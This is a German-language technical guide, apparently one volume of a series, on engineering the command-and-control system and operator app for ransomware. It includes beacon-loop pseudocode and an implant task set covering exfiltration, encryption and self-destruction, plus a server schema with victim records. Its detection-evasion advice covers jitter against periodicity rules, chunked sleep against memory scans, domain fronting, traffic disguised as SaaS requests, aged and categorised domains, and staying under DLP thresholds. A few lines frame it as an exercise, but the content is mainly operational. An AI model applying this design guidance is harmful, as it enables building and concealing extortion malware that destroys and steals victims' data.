# Ransomware – Band 11: C2 und Steuerungsapp technisch

Programmiertechnischer Band: Beacon-Loop, Task-Modell, Transport, mTLS, Server-Datenmodell, OPSEC. Quellen am Ende.

## 1. Kommunikationsmodell — Auswahl mit Begründung

| Modell | Stärken | Grenzen |
|---|---|---|
| **HTTPS-Polling** | mischt sich unter Web-Traffic, CDN-tauglich | periodisches Muster detektierbar [1] |
| **DNS** | kommt durch die meisten Firewalls | TXT ≈ 255 Byte, hohe Latenz [1] |
| **Named Pipes** | Laterale Kette ohne Egress pro Host | braucht SMB-Zugriff [1] |
| **WebSockets** | Echtzeit, niedrige Latenz | langlebige Verbindungen sind anormal [1] |
| **mTLS (Zertifikat gegenseitig)** | stärkste Authentifizierung, schwer zu MITM-en | Zertifikats-Infrastruktur nötig [2] |

**Empfohlenes Schichtenmodell** [1]:

```
Externer Beacon (HTTPS)  ← Edge-Host
   ↕ Named Pipe
Interner Host A          ← kein externer Netzwerkzugriff
   ↕ Named Pipe
Interner Host B
   ↕ SMB
Domänencontroller
```

Für eine Ransomware-Steuerungsapp heißt das konkret: **ein Beacon-Protokoll, zwei Transporte** (HTTPS für den ersten Host pro Netz, Pipe/SMB für die Stummen). Das reduziert Egress-Profil und Egress-Regeln erheblich (freie Einordnung).

## 2. Der Beacon-Loop

Kanonisches Muster [1]:

```
loop {
    sleep_obfuscated(base_sleep * (1.0 + random(-0.2, 0.2)));
    tasks   = http_post("/api/beacon", session_metadata);
    results = [ execute_task(t) for t in tasks ];
    if !results.is_empty():
        http_post("/api/results", encrypt(results));
}
```

**Jitter ist Pflicht.** Ohne Jitter entsteht Äquidistanz: `30s, 30s, 30s` ist mit einer Zeile Regel erkennbar (`abs(interval − 60) < 2`); mit 20 % Jitter wird daraus `26, 33, 28, 35` [1][3]. Reine Periodizitäts-Erkennung ist eine der billigsten Detektionsarten überhaupt — also zuerst gegen sich selbst testen.

**Freie Einordnung, zwei Punkte, die Leitfäden häufig offen lassen:**
1. **Jitter muss zustandsbehaftet sein.** Neu gewürfelter Sleep pro Zyklus ist gut, aber zusätzlich braucht es Fallback-Delays bei Serverunreachable (exponentiell + Jitter) und einen **maximalen Gesamtlaufzeitzwang** — sonst schläft ein Implantat im Fehlerfall zu lange und verschlüsselt nie.
2. **Sleep muss chunked sein.** Lange Schlafphasen am Stück sind ein bekannter Memory-Forensik-Hebel (Memory-Scans während der Wachphase). In kurzen Stücken schlafen, Puffer dazwischen neu allokieren.

## 3. Task-Modell — die eigentliche Ingenieursarbeit

Aus dem Praxisbericht zum Selbstbau einer C2-Plattform [2]:
- **Task-Queue vor dem Check-in**: da ein Implantat nicht sofort prüft, werden Aufgaben voraus eingeplant; jede erscheint in einer Queue-Ansicht und **kann abgebrochen werden** [2]
- **mTLS war mühsam, nicht schwer**: Sobald CA, Server-Zertifikat und Client-Zertifikat stehen, ist der Code geradlinig. Die Arbeit liegt in **Erzeugung und Verteilung** der Zertifikate [2]

Für eine Ransomware-App ist das Task-Set klein, aber invariants-sensibel:

| Task | Semantik | Pflicht |
|---|---|---|
| `enumerate` | Inventur + Freigaben + VSS-Status | Ergebnis reportbar, keine Mutation |
| `exfiltrate` | Liste + Stichprobe heraus | Fortschritt, Abbruch, Bandbreitendeckel |
| `encrypt` | Start mit Scope/Rate/Lock-Mode | **idempotent**, Task-ID-gebunden |
| `pause` / `resume` | Encoderrate auf 0 bzw. zurück | muss mitten im Chunk greifen |
| `abort` | Encoder stoppen | Manifest muss konsistent bleiben |
| `decrypt` | Rollback mit Key-Import | Offline-Fähigkeit |
| `selfdestruct` | Binary + Journal löschen | Key-Escrow **vor** Löschung bestätigen |
| `config` | Scopes, Listen, Modus ändern | versioniert, rückholbar |

**Drei Invarianten, ohne die eine Steuerungsapp bei Ransomware unbrauchbar wird** (freie Einordnung):
1. **Idempotenz über Task-ID.** Ein Beacon darf denselben Task nach Netzwerkfehler zweimal erhalten und bekommt ihn zweimal — ohne Deduplizierung verschlüsselt er doppelt oder schreibt das Manifest kaputt. Lösung: Task-ID + Akzept-/Ausführungsstatus im Implantat-Journal.
2. **Key-Escrow vor Effekt.** Kein `encrypt` ohne bestätigten Server-Empfang des gewrappten Host-Keys. Sonst existiert ein Moment, in dem Daten weg und der Schlüssel nirgends ist.
3. **Konfig-Rollback ist kein Wunsch.** Jede Rollout-Aktion braucht einen umkehrbaren Zustand (z. B. `--dry-run`-Pflicht vor Scharfschalten auf Produktion) — sonst ist ein Fehlclick auf 40 Hosts ein selbstverschuldeter Incident.

## 4. Transport-OPSEC

- **Domain Fronting:** TLS-SNI auf große CDN-Domain, `Host:`-Header zeigt auf den eigenen C2 — die Verbindung sieht nach dem CDN aus [1]
- **Malleable Profile:** Request formattiert wie ein legitimer SaaS-Client (`GET /api/v2/users/profile`, `Authorization: Bearer …`, `X-Request-ID: <verschlüsselte Beacon-Daten>`) [1]
- **Zertifikats-/Domänenhygiene:** Domäne Monate vorher registrieren, Kategorie „Technology"/„Business" prüfen lassen, Let's Encrypt für gültige Zertifikate, Domänen regelmäßig rotieren [1]
- **Traffic-Menge** unter DLP-Schwellen halten, wenn Content nicht wirklich exfiltriert wird — relevant gerade für Lock-Only-/Dry-Run-Modi [4]

## 5. Server-Datenmodell der Steuerungsapp

Minimalschema (freie Einordnung):

```
hosts(id, hostname, internal_ip, domain, os, agent_version,
      first_seen, last_seen, state, victim_id)
keys (id, host_id, wrapped_dek, kem_ciphertext, public_key,
      escrow_state, created_at, revoked_at)
tasks(id, host_id, type, payload_json, desired_state,
      accepted_at, started_at, finished_at, attempts, error)
events(id, host_id, at, type, payload_json)          -- Audit, nie Update-Ersatz
scopes(id, host_id, name, includes, excludes, rate_kbps, mode)
runs(id, scope_id, started_by, started_at, dry_run, outcome)
```

**Warum `events` separat von `hosts`:** Der Host-Zustand ist nur das Aggregat; für Nachweis, Schulung und Fehleranalyse zählt der zeitliche Verlauf. Wer nur Zustand speichert, kann später nicht mehr sagen, wer wann welchen Scope gesetzt hat (freie Einordnung).

**Rollen (freie Einordnung):** mindestens drei — *Operator* (Scopes, Start/Stop), *Analyst* (read-only + Events), *Key-Holder* (Escrow-Ansicht, Export, nur mit Zweiten-Person-Bestätigung). Der häufigste Architekturfehler ist ein einziger Admin-Login für alles.

## 6. Was eine Steuerungsapp bei Ransomware zusätzlich können muss

Im Unterschied zu klassischem C2 (Aufmerksamkeit auf Beacon-Tarnung) kommen hier drei Funktionen dazu, die sonst fehlen:

1. **Key-Escrow mit Vier-Augen-Freigabe** — Export eines Host-Keys ohne zweite Person verbieten, Export protokollieren.
2. **Rate-Limiting pro Host und pro Scope** — ohne Deckel läuft der Encoder auf einem 96-Kern-Fileserver in Minuten durchs Netz und löst Kapazitätsalarme aus, bevor die Übung ihren Zweck hat.
3. **Dry-Run als eigener, privilegierter Modus** — Enumeration + Report + geschätzte Dateimenge und -volumen, **keine** Mutation. Ohne diesen Modus will niemand das Implantat auf Produktivdaten loslassen.

## Quellen

- [1] ROBINX0 – Designing a Modern C2 Implant: Architecture and OPSEC (20.03.2026): https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/
- [2] Israel Fernandez – Building a Cross-Platform C2 Framework from Scratch (Task-Queue, Cancel, mTLS-Aufwand): https://israel-fernandez.com/blog/building-a-c2-framework
- [3] 32bin – C2-Framework selbst bauen, Teil 1: Prinzipien, Funktionen und Rote-Team-Sicht (Jitter-Begründung, Periodizitätsregel): https://www.cnblogs.com/32bin/p/20905938
- [4] GBHackers – Windows CreateFileW API Flaw (Lock-only-Angriff ohne Write-Events): https://gbhackers.com/windows-createfilew-api-flaw/
- Querverweis: Band 05 (Abwehr/IR), Band 09 (Key-Escrow Krypto), Band 12 (Testharness)
